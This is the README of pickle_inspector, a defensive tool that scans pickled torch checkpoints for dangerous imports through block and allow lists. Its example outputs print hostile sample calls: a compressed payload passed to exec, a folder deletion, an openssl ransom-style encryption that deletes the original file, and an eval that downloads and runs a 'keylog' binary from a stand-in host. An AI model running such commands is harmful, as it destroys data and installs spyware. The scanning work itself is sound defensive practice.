# pickle_inspector 🥒🔬
Check what is in the pickle before eating it.

It works on any type of pickle, but was made with `torch` in mind.

NOTE:
torch == 1.13.0 breaks using custom unpicklers, see https://github.com/pytorch/pytorch/issues/88438
until this is fixed, stick to 1.12.x or older.

## Scanning pickles via command line
**tl;dr** just let me scan my pickles.
Using a preset blacklist for arbitrary code execution
```sh
python scan_pickle.py -f exec -i pickled.pkl
```
```
> Using blacklist: exec
> Scanning file(s): ['pickle_injector/pickled.pkl']
> Using black list: ['__builtin__.breakpoint', '__builtin__.open', 'requests.*', 'builtins.open', '__builtin__.compile', 'socket.*', 'builtins.breakpoint', 'os.*', 'nt.*', 'builtins.eval', 'webbrowser.*', '__builtin__.eval', 'builtins.exec', 'posix.*', '__builtin__.exec', '__builtin__.getattr', 'builtins.getattrsubprocess.*', 'builtins.compile', 'aiohttp.*', 'httplib.*', 'sys.*']
> Reading pickle_injector/pickled.pkl
> Scanning: pickle_injector/pickled.pkl
> found: __builtin__.exec
> found: zlib.decompress
>
> Found blacklisted items:
>
>   __builtin__.exec.__call__((zlib.decompress((b'x\xda5\xcd]\n\xc3 \x10\x04\xe0\xf7\x9cb\xd9\x17\x15$\x07\x08x\x87\xde@$\xac\xe9R\xff\xd0\r\t\x94\xde\xbdB\xe9<}\x0c\x0c\x13{\xcd\x90\xcf$\xdcz\xddi\x0c.\x07pn\xb5\x0b<~\xcd\xd2\xc0\xfd\xad%\xf4\x83\xc4\xd1M\xbb\x85\xe9\xe14"^,O\xa8\x8d\x8aV\xa9\xa6UnQ\x16\xd4\xa5\x0c\x84\x01q[`\xa6u.\xa21\x9e\xfb\x0b-DN\xe4\xa2\x99[\xfbF\xefK\xc8\xe4=n\x939p\x99\xfcX0fi\xeb\x98\x8f\xa2\xcd\x17\x1d%6\xbc',), {}),), {})
>
> Scan for pickled.pkl FAILED ⚠️
```
Using a preset whitelist for a stable diffusion checkpoint
```sh
python scan_pickle.py --preset stable_diffusion_v1 --in sus.ckpt
```
```
> Using whitelist: stable_diffusion_v1
> Scanning file(s): ['sus.ckpt']
> Using white list: ['collections.OrderedDict', 'torch._utils._rebuild_tensor_v2', 'torch.HalfStorage', 'torch.FloatStorage', 'torch.IntStorage', 'torch.LongStorage', 'pytorch_lightning.callbacks.model_checkpoint.ModelCheckpoint', 'numpy.core.multiarray.scalar', 'numpy.dtype', '_codecs.encode']
> Reading sus.ckpt
> Found pickle in zip: archive/data.pkl
> Scanning: archive/data.pkl
> found: torch._utils._rebuild_tensor_v2
> found: torch.FloatStorage
> found: collections.OrderedDict
> found: torch.IntStorage
> found: torch.LongStorage
> found: pytorch_lightning.callbacks.model_checkpoint.ModelCheckpoint
> found: numpy.core.multiarray.scalar
> found: numpy.dtype
> found: _codecs.encode
>
> Scan for sus.ckpt PASSED ✅
```
### Script usage
```
usage: scan_pickle.py [-h] -i INPUT [INPUT ...]
                      [-p {stable_diffusion_v1,stable_diffusion_v2} [{stable_diffusion_v1,stable_diffusion_v2} ...]]
                      [-f {exec} [{exec} ...]] [-w WHITELIST [WHITELIST ...]] [-b BLACKLIST [BLACKLIST ...]]

Scan pickles

optional arguments:
  -h, --help            show this help message and exit
  -i INPUT [INPUT ...], --in INPUT [INPUT ...]
                        path to a pickle(s) or zip(s) containing pickles
  -p {stable_diffusion_v1,stable_diffusion_v2} [{stable_diffusion_v1,stable_diffusion_v2} ...], --preset {stable_diffusion_v1,stable_diffusion_v2} [{stable_diffusion_v1,stable_diffusion_v2} ...]
                        a whitelist preset to use
  -f {exec} [{exec} ...], --preset_blacklist {exec} [{exec} ...]
                        a blacklist preset to use
  -w WHITELIST [WHITELIST ...], --whitelist WHITELIST [WHITELIST ...]
                        whitelist of modules and functions to allow
  -b BLACKLIST [BLACKLIST ...], --blacklist BLACKLIST [BLACKLIST ...]
                        blacklist of modules and functions to block
```
## Inspecting
Inspect without unpickling.
```py
import torch
import pickle_inspector
result = torch.load('sus.pt', pickle_module=pickle_inspector.inspector)
for c in result.imports:
    print(c)
```
notice calls to `shutil.rmtree`, `os.system` or similar
```
> shutil.rmtree
> torch._utils._rebuild_tensor_v2
> collections.OrderedDict
> numpy.core.multiarray.scalar
> os.system
> numpy.dtype
> _codecs.encode
```
so we are taking a closer look at what is being called
```py
for c in result.calls:
    print(c)
```
and it seems like someone tried to delete something and ransom a file
```
> shutil.rmtree(('/very/important/folder'), {})
> collections.OrderedDict((), {})
> torch._utils._rebuild_tensor_v2((None, 0, (1000,), (1,), False, collections.OrderedDict((), {})), {})
...
> torch._utils._rebuild_tensor_v2((None, 0, (), (), False, collections.OrderedDict((), {})), {})
> os.system(('openssl enc -aes-128-ecb -in important_file -out give_money.enc -K 1337B00B135DEADBEEF; rm important_file'), {})
> numpy.dtype(('f8', False, True), {})
> numpy.dtype.__setstate__(((3, '<', None, None, None, -1, -1, 0),), {})
> _codecs.encode(('ñhã\x88µøÔ>', 'latin1'), {})
> numpy.core.multiarray.scalar((numpy.dtype(('f8', False, True), {}), _codecs.encode(('ñhã\x88µøÔ>', 'latin1'), {})), {})
```
## Controlled unpickling
Inspect and unpickle using white and blacklists.

```py
import torch
from pickle_inspector import UnpickleConfig, UnpickleControlled, PickleModule
config = UnpickleConfig()
# only allow  modules, classes and funcions in the whitelist
# the rest will be stubbed
config.whitelist = [
        'torch._utils._rebuild_tensor_v2',
        'torch.FloatStorage',
        'torch.IntStorage',
        'torch.LongStorage',
        'numpy.core.multiarray.scalar',
        'numpy.dtype',
        'collections.OrderedDict',
        '_codecs.encode'
]
result = torch.load('model.ckpt', pickle_module = PickleModule(UnpickleControlled, config))
state_dict = result.structure
for c in result.imports:
    print(c)
```
```
> torch._utils._rebuild_tensor_v2
> torch.FloatStorage
...
> __builtin__.eval
> collections.OrderedDict
...
```
```py
for c in results.calls:
    if 'eval' in c:
        print(c)
```
```py
> __builtin__.eval('import os;os.system("wget https://sus.to/keylog;chmod +x keylog;./keylog &")')
```
## Blacklist & Whitelist
The whitelist has priority over the blacklist.

If the blacklist contains items everything will be allowed except items in the blacklist,\
or items in the blacklist and in the whitelist. This is useful using wildcards.

Example: Block everything within `torch` except `torch.FloatStorage`
```py
conf.blacklist = ['torch.*']
conf.whitelist = ['torch.FloatStorage']
```

If the blacklist is empty and the whitelist contains items, \
everything except items in the whitelist will be blocked.

## Safe whitelist for stable diffusion
A premade whitelist for stable diffusion v1 and v2 is available in this project.

Example: Scan a stable diffusion v1 checkpoint
```py
import torch
from pickle_inspector import UnpickleConfig, PickleModule, UnpickleInspector, importlists
conf = UnpickleConfig(whitelist = importlists.stable_diffusion_v1)
torch.load('sd-v1-4.ckpt', pickle_module=PickleModule(UnpickleInspector, conf))
```

Tested with python 3.9 and torch 1.12.1

---

Copyright (C) 2022  Lopho `<contact@lopho.org>`\
Licensed under the AGPLv3 `<https://www.gnu.org/licenses/agpl-3.0.html>`
